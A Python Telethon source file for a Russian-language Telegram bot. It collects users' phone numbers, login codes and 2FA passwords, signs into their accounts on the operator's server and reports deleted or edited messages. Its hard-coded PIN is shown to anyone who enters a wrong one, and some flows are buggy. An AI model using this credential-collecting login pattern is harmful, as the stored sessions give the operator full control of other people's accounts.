import os
import asyncio
import logging
import random
from datetime import datetime, timedelta
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError,
    FloodWaitError
)
from telethon.tl.custom import Button
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

bot = TelegramClient('bot', API_ID, API_HASH)

# ========== СТИКЕРЫ УТКИ ==========
DUCK_STICKERS = {
    'happy': ['🦆✨', '🦆⭐', '🦆🎉', '🦆✅', '🦆👍'],
    'sad': ['🦆😢', '🦆💔', '🦆❌', '🦆😞', '🦆😭'],
    'waiting': ['🦆🤔', '🦆⌛', '🦆⏳', '🦆🔄', '🦆👀'],
    'working': ['🦆⚙️', '🦆🔧', '🦆💻', '🦆📱', '🦆🛠️'],
    'numbers': ['🦆0️⃣', '🦆1️⃣', '🦆2️⃣', '🦆3️⃣', '🦆4️⃣', '🦆5️⃣', '🦆6️⃣', '🦆7️⃣', '🦆8️⃣', '🦆9️⃣']
}

def get_duck_sticker(mood='happy', number=None):
    if mood == 'numbers' and number is not None:
        return DUCK_STICKERS['numbers'][number % 10]
    return random.choice(DUCK_STICKERS.get(mood, DUCK_STICKERS['happy']))

# ========== ХРАНИЛИЩЕ ==========
user_sessions = {}
authorized_users = set()
ACCESS_PIN = "5482"
message_cache = {}
user_contacts = {}
user_clients = {}
flood_wait_until = {}  # {user_id: datetime}

# ========== ВСПОМОГАТЕЛЬНЫЕ ==========
async def safe_edit(message, new_text, buttons=None):
    try:
        if message.text != new_text:
            await message.edit(new_text, buttons=buttons)
    except:
        pass

async def show_duck_animation(event, text, mood='waiting', duration=2):
    msg = await event.reply(f"{get_duck_sticker(mood)} {text}")
    for i in range(duration):
        await asyncio.sleep(1)
        await msg.edit(f"{get_duck_sticker('working')} {text}")
    return msg

# ========== ОБРАБОТЧИК ==========
@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.text.strip()

    # === ПРОВЕРКА FLOOD WAIT ===
    if user_id in flood_wait_until and datetime.now() < flood_wait_until[user_id]:
        wait_time = (flood_wait_until[user_id] - datetime.now()).seconds // 60
        await event.reply(
            f"{get_duck_sticker('sad')} **Слишком много попыток!**\n\n"
            f"⏳ Подожди ещё {wait_time} минут\n"
            f"📅 Разблокировка: {flood_wait_until[user_id].strftime('%H:%M %d.%m')}"
        )
        return

    # === ПИН-КОД ===
    if user_id not in authorized_users:
        if text == ACCESS_PIN:
            authorized_users.add(user_id)
            await event.reply(
                f"{get_duck_sticker('happy')} **Пин-код верный!**\n\n"
                f"👇 Выбери действие:",
                buttons=[
                    [Button.text("📱 Отправить мой номер", resize=True)],
                    [Button.text("📞 Ввести номер вручную")]
                ]
            )
        else:
            await event.reply(f"{get_duck_sticker('sad')} **Неверный пин-код!**\nВведи: `5482`")
        return

    # === ГЛАВНОЕ МЕНЮ ===
    if text == "/start":
        await event.reply(
            f"{get_duck_sticker('happy')} **Добро пожаловать!**\n\n"
            f"Выбери способ входа:",
            buttons=[
                [Button.text("📱 Отправить мой номер", resize=True)],
                [Button.text("📞 Ввести номер вручную")],
                [Button.text("❓ Помощь")]
            ]
        )
        return

    # === ПОМОЩЬ ===
    if text == "❓ Помощь":
        await event.reply(
            f"{get_duck_sticker('waiting')} **Как войти:**\n\n"
            f"1️⃣ **Пин-код:** 5482\n"
            f"2️⃣ **Отправить номер:** нажми кнопку и подтверди\n"
            f"3️⃣ **Ввести номер:** введи вручную +79001234567\n"
            f"4️⃣ **Код:** придёт в Telegram\n"
            f"5️⃣ **2FA:** если есть пароль — введи его\n\n"
            f"⚠️ **Если слишком много попыток — Telegram блокирует на сутки!**"
        )
        return

    # === ОТПРАВКА НОМЕРА ===
    if text == "📱 Отправить мой номер":
        await event.reply(
            f"{get_duck_sticker('waiting')} **Нажми кнопку ниже,**\n"
            f"чтобы отправить свой номер:",
            buttons=[[Button.request_contact("📞 Поделиться контактом")]]
        )
        return

    # === ВВОД НОМЕРА ВРУЧНУЮ ===
    if text == "📞 Ввести номер вручную":
        user_sessions[user_id] = {'step': 'waiting_phone'}
        await event.reply(
            f"{get_duck_sticker('waiting')} **Введи номер в формате:**\n"
            f"`+79001234567`"
        )
        return

    # === ПОЛУЧЕНИЕ НОМЕРА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_phone':
        phone = text
        user_sessions[user_id]['phone'] = phone
        user_sessions[user_id]['step'] = 'waiting_code'
        
        anim = await show_duck_animation(event, "Отправляю код...", 'working', 2)
        
        try:
            client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
            await client.connect()
            
            sent_code = await client.send_code_request(phone)
            
            user_sessions[user_id]['client'] = client
            user_sessions[user_id]['code_hash'] = sent_code.phone_code_hash
            
            await anim.edit(
                f"{get_duck_sticker('happy')} **Код отправлен!**\n\n"
                f"📨 Проверь Telegram\n"
                f"⏳ Код действителен 2 минуты\n"
                f"👇 **Введи код:**"
            )
            
        except FloodWaitError as e:
            # Обработка Flood Wait
            seconds = e.seconds
            wait_until = datetime.now() + timedelta(seconds=seconds)
            flood_wait_until[user_id] = wait_until
            
            hours = seconds // 3600
            minutes = (seconds % 3600) // 60
            
            await anim.edit(
                f"{get_duck_sticker('sad')} **Telegram заблокировал отправку кодов!**\n\n"
                f"⏳ Подожди {hours} ч {minutes} мин\n"
                f"📅 Разблокировка: {wait_until.strftime('%H:%M %d.%m')}\n\n"
                f"❌ Слишком много попыток входа"
            )
            
            if user_id in user_sessions:
                del user_sessions[user_id]
            
        except Exception as e:
            await anim.edit(f"{get_duck_sticker('sad')} **Ошибка:** {e}")
            if user_id in user_sessions:
                del user_sessions[user_id]
        return

    # === ПОЛУЧЕНИЕ КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_code':
        code = text.strip()
        session = user_sessions[user_id]
        client = session['client']
        
        anim = await show_duck_animation(event, "Проверяю код...", 'working', 2)
        
        try:
            await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
            
            me = await client.get_me()
            user_clients[user_id] = client
            
            await anim.edit(
                f"{get_duck_sticker('happy')} **Успешный вход!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"🆔 ID: {me.id}\n\n"
                f"🔍 **Мониторинг запущен!**"
            )
            
            if user_id in user_sessions:
                del user_sessions[user_id]
            
            asyncio.create_task(monitor_user_chats(user_id, client))
            
        except SessionPasswordNeededError:
            user_sessions[user_id]['step'] = 'waiting_2fa'
            await anim.edit(
                f"{get_duck_sticker('waiting')} **Требуется двухфакторный пароль.**\n\n"
                f"Введи свой пароль:"
            )
            
        except PhoneCodeInvalidError:
            await anim.edit(
                f"{get_duck_sticker('sad')} **Неверный код!**\n\n"
                f"Попробуй ещё раз:"
            )
            
        except PhoneCodeExpiredError:
            await anim.edit(
                f"{get_duck_sticker('sad')} **Код истёк.**\n\n"
                f"Нажми /start и начни заново."
            )
            if user_id in user_sessions:
                del user_sessions[user_id]
            
        except Exception as e:
            await anim.edit(f"{get_duck_sticker('sad')} **Ошибка:** {e}")
            if user_id in user_sessions:
                del user_sessions[user_id]
        return

    # === 2FA ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_2fa':
        password = text
        session = user_sessions[user_id]
        client = session['client']
        
        anim = await show_duck_animation(event, "Проверяю пароль...", 'working', 2)
        
        try:
            await client.sign_in(password=password)
            
            me = await client.get_me()
            user_clients[user_id] = client
            
            await anim.edit(
                f"{get_duck_sticker('happy')} **Вход с 2FA выполнен!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"🆔 ID: {me.id}\n\n"
                f"🔍 **Мониторинг запущен!**"
            )
            
            if user_id in user_sessions:
                del user_sessions[user_id]
            
            asyncio.create_task(monitor_user_chats(user_id, client))
            
        except Exception as e:
            await anim.edit(f"{get_duck_sticker('sad')} **Ошибка:** {e}")
        return

# === ОБРАБОТКА КОНТАКТА ===
@bot.on(events.NewMessage(func=lambda e: e.message.contact))
async def contact_handler(event):
    user_id = event.sender_id
    contact = event.message.contact
    
    # Проверяем, что номер принадлежит пользователю
    if str(user_id) != str(contact.user_id):
        await event.reply(f"{get_duck_sticker('sad')} **Это не твой номер!**")
        return
    
    user_contacts[user_id] = {
        'phone': contact.phone_number,
        'first_name': contact.first_name
    }
    
    await event.reply(
        f"{get_duck_sticker('waiting')} **Контакт получен!**\n\n"
        f"Номер: `{contact.phone_number}`\n\n"
        f"**Использовать для входа?**",
        buttons=[
            [Button.text("✅ Да, войти")],
            [Button.text("❌ Нет")]
        ]
    )

@bot.on(events.NewMessage)
async def confirm_contact_handler(event):
    user_id = event.sender_id
    text = event.message.text
    
    if text == "✅ Да, войти" and user_id in user_contacts:
        contact = user_contacts[user_id]
        user_sessions[user_id] = {
            'step': 'waiting_phone',
            'phone': contact['phone']
        }
        await handler(event)
    elif text == "❌ Нет" and user_id in user_contacts:
        del user_contacts[user_id]
        await event.reply(f"{get_duck_sticker('sad')} **Отменено**")

# === МОНИТОРИНГ ===
async def monitor_user_chats(user_id, client):
    await bot.send_message(user_id, f"{get_duck_sticker('happy')} **Мониторинг запущен!**")
    
    @client.on(events.NewMessage)
    async def on_new(event):
        if hasattr(event.message, 'ttl_seconds') and event.message.ttl_seconds:
            await bot.send_message(
                user_id,
                f"{get_duck_sticker('waiting')} **Истекающее сообщение** в чате {event.chat_id}"
            )
    
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        await bot.send_message(user_id, f"{get_duck_sticker('sad')} **Удалено** {len(event.deleted_ids)} сообщений")
    
    @client.on(events.MessageEdited)
    async def on_edit(event):
        await bot.send_message(user_id, f"{get_duck_sticker('waiting')} **Изменено** сообщение")
    
    await client.run_until_disconnected()

# === ЗАПУСК ===
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
    logger.info("🦆 Flood Wait защита активна")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())